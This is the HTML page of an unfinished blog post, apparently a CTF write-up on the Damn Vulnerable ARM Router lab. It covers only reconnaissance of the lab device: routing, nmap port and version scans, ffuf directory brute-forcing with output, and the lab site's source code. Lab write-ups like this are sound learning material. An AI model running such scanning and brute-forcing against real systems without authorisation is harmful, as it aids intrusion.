@@ -1,0 +1,1558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>PWN: Exploiting Vulnerable ARM Router :: yocvito website</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="A write-up for the Damn Vulnerable ARM Router CTF" />
+<meta name="keywords" content="write-up, pwn, arm" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/pwn-dvar/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/style.min.1cdbb7cf76923868c5b397f2052baabd091aedcc09ffebdd5da68e6d56712689.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.dc41063add420c2d2107bf5328b2f5abe23fb57e24dbc4fa9e7827b9f5bd8f9a.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="yocvito" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="PWN: Exploiting Vulnerable ARM Router">
+<meta property="og:description" content="A write-up for the Damn Vulnerable ARM Router CTF" />
+<meta property="og:url" content="//localhost:1313/posts/pwn-dvar/" />
+<meta property="og:site_name" content="yocvito website" />
+
+  
+  
+  <meta property="og:image" content="//localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-11-19 16:55:56 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    yocvito
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog</a></li>
+        
+      
+        
+          <li><a href="/projects">Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume">Resume / CV</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog</a></li>
+        
+      
+        
+          <li><a href="/projects" >Projects</a></li>
+        
+      
+        
+          <li><a href="/about/resume" >Resume / CV</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/pwn-dvar/">PWN: Exploiting Vulnerable ARM Router</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-11-19</time><span class="post-author">yocvito</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/write-up/">write-up</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/pwn/">pwn</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/arm/">arm</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#rules">Rules</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#discovery">Discovery</a></li>
+        <li><a href="#investigating-web-services">Investigating web services</a>
+          <ul>
+            <li><a href="#lights-control-website">Lights Control website</a></li>
+            <li><a href="#router-administration-website">Router Administration website</a></li>
+          </ul>
+        </li>
+        <li><a href="#white-box">white-box</a>
+          <ul>
+            <li><a href="#miniweb">miniweb</a></li>
+            <li><a href="#lightsrv">lightsrv</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h1 id="damn-vulnerable-arm-router">Damn Vulnerable ARM Router<a href="#damn-vulnerable-arm-router" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><em><strong>This write-up is WIP</strong></em></p>
+<p>In this blog post, we will practice ARM exploitation by solving the <a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html"><strong>Damn Vulnerable ARM Router</strong> challenge</a>. As its name suggests, it is an ARM Linux running a vulnerable Web server, and we want to get control of the device.</p>
+<h2 id="rules">Rules<a href="#rules" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<blockquote>
+<p>Using your host computer&rsquo;s browser, navigate to the URL and follow the instructions and clues. The virtual network adapter is set to NAT mode.
+Your goal is to write a working stack overflow exploit for the web server running on the DVAR tinysploitARM target. It also includes a bonus challenge.</p>
+</blockquote>
+<p>There is not a lot of explicit instructions and rules for this challenge, so I added the following constraints:</p>
+<ul>
+<li>Don&rsquo;t use the docker shell, except for debugging purposes (identify subnet ip, see logs, etc&hellip;)</li>
+<li>If possible, the firmware binaries need to be retrieved by interacting with the web services.</li>
+</ul>
+<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="discovery">Discovery<a href="#discovery" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>First, we enumerate the remote host in order to find opened network services (and spot web related services).</p>
+<p>The firmware is running inside a docker, emulated by <code>qemu-arm</code>. The docker IP is <code>172.17.0.3</code> but the DVAR device is internally connected to the <code>192.168.100.0/24</code> network.</p>
+<p>We cannot communicate with the internal network by default:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ping 192.168.100.2
+</span></span><span style="display:flex;"><span>PING 192.168.100.2 <span style="color:#f92672">(</span>192.168.100.2<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span>From 192.168.1.254 icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> Destination Host Unreachable
+</span></span><span style="display:flex;"><span>From 192.168.1.254 icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> Destination Host Unreachable
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span>--- 192.168.100.2 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets transmitted, <span style="color:#ae81ff">0</span> received, +2 errors, 100% packet loss, time 1002ms
+</span></span></code></pre></div><p>We need to add a route to the network using the docker container ip.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ip route add 192.168.100.0/24 via 172.17.0.3
+</span></span></code></pre></div><p>We are now able to communicate with the device.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ping 192.168.100.2
+</span></span><span style="display:flex;"><span>PING 192.168.100.2 <span style="color:#f92672">(</span>192.168.100.2<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.2: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>0.463 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.2: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span>0.439 ms
+</span></span><span style="display:flex;"><span>^C
+</span></span><span style="display:flex;"><span>--- 192.168.100.2 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> packets transmitted, <span style="color:#ae81ff">2</span> received, 0% packet loss, time 1023ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.439/0.451/0.463/0.012 ms
+</span></span></code></pre></div><p>Performing stealthy (a bit) network port scanning:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -sS -T4 -p- 192.168.100.2 -Pn
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 14:14 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.2
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0019s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp    open  http
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy
+</span></span><span style="display:flex;"><span>22222/tcp open  easyengine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 6.20 seconds
+</span></span></code></pre></div><p>Try retrieving version of known services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nmap -sV -p80,8080,22222 192.168.100.2 -Pn
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-20 14:42 CET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.2
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00065s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>80/tcp    open  http       EXPLOITLAB/2.0
+</span></span><span style="display:flex;"><span>8080/tcp  open  http-proxy
+</span></span><span style="display:flex;"><span>22222/tcp open  ssh        Dropbear sshd 2020.81 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>2 interesting web services at <code>80</code> and <code>8080</code>, respectively a <strong>light control system</strong> and the <strong>administration website</strong> of the router. The <code>ssh</code> service doesn&rsquo;t seems of interest as it&rsquo;s running a Dropbear ssh daemon version which does not have known exploits.</p>
+<p><em>We assume extended scanning have been conducted to be sure there was no additional network services behind a simple firewall (FIN scan, ACK scan, &hellip;).</em></p>
+<h3 id="investigating-web-services">Investigating web services<a href="#investigating-web-services" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>We will now analyze the web services by hand. The goal is to find where we can interact with the server, how it is done, what type of data we can send, and if we can exploit it.</p>
+<p>In parallel, we run web enumeration tools to find other endpoints on the services. (<em>Might be dangerous because it could trigger alerts</em>)</p>
+<h4 id="lights-control-website">Lights Control website<a href="#lights-control-website" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<h5 id="web-enum">Web enum<a href="#web-enum" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># bruteforce router administration website</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - recursively scan from root</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - use common.txt wordlist</span>
+</span></span><span style="display:flex;"><span>ffuf -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -u http://192.168.100.2:8080/FUZZ -noninteractive
+</span></span></code></pre></div><p>It doesn&rsquo;t find anything interesting except the <code>index.html</code></p>
+<h5 id="manual-investigation">Manual investigation<a href="#manual-investigation" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<p><img alt="Lights Controll website" src="/img/dvar/lights_ctrl.png"></p>
+<p>2 buttons allowing to switch the state and picture displayed.
+The bottom right logo is not clickable</p>
+<h6 id="source-code">Source code<a href="#source-code" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>The webpage source code is quite simple. It just ships a <code>js</code> script for modifying state and picture, and the html code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTML" data-lang="HTML"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html public &#34;-//w3c//dtd html 4.0 transitional//en&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- (c) THE ARM EXPLOIT LABORATORY, Saumil Shah @therealsaumil --&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;styles.css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Lights Control&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span>, <span style="color:#a6e22e">img</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">init</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createXHR</span>();
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">img</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;signal&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lights</span>(<span style="color:#a6e22e">state</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;lights/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">state</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() { <span style="color:#a6e22e">handleresponse</span>(<span style="color:#a6e22e">xhr</span>); };
+</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleresponse</span>(<span style="color:#a6e22e">xhr</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ON&#34;</span>) {
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">img</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;walk.png&#34;</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">img</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dont_walk.png&#34;</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">createXHR</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {}
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Msxml2.XMLHTTP.6.0&#34;</span>); } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Msxml2.XMLHTTP.3.0&#34;</span>); } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Msxml2.XMLHTTP&#34;</span>); } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> { <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>); } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;init()&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;centrebody&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bottomright&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;r0.png&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">h1</span>&gt;Lights Control&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signal&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dont_walk.png&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-red&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lights(&#39;off&#39;);&#34;</span>&gt;DONT&lt;<span style="color:#f92672">br</span>&gt;WALK&lt;/<span style="color:#f92672">button</span>&gt; 
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button-green&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lights(&#39;on&#39;);&#34;</span>&gt;&amp;nbsp;&lt;<span style="color:#f92672">br</span>&gt;WALK&lt;/<span style="color:#f92672">button</span>&gt; 
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The code showcase that <strong>no fancy frontend frameworks are used</strong>, only custom html/css/js code. The <strong>server might also be a custom implementation</strong> because it remains very simple in the way it handles api calls and returns results. We will try later to retrieve the binary running this service in order to find a vuln.</p>
+<p><em>We could try to exploit common web vulnerabilities to try to leak sensitive informations or exploit it. But as the challenge is about binary exploitation, it&rsquo;s unlikely we have to do that.</em></p>
+<h4 id="router-administration-website">Router Administration website<a href="#router-administration-website" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<h5 id="web-enum-1">Web enum<a href="#web-enum-1" class="hanchor" ariaLabel="Anchor">#</a> </h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># bruteforce router administration website</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># - filter response size equals to 300 (the webserver </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   returns a 200 error code with custom message on </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   non existing endpoint)</span>
+</span></span><span style="display:flex;"><span>ffuf -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.2:80/FUZZ -noninteractive -fs <span style="color:#ae81ff">300</span>
+</span></span></code></pre></div><p>Result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.100.2:80/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : true
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,5
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cgi-bin/                <span style="color:#f92672">[</span>Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2072ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cgi-bin2                <span style="color:#f92672">[</span>Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2148ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cgi-bin                 <span style="color:#f92672">[</span>Status: 200, Size: 278, Words: 17, Lines: 13, Duration: 2032ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.html              <span style="color:#f92672">[</span>Status: 200, Size: 67448, Words: 12624, Lines: 1291, Duration: 2022ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Enumeration showcase the use of <code>cgi-bin</code> by the server.</p>
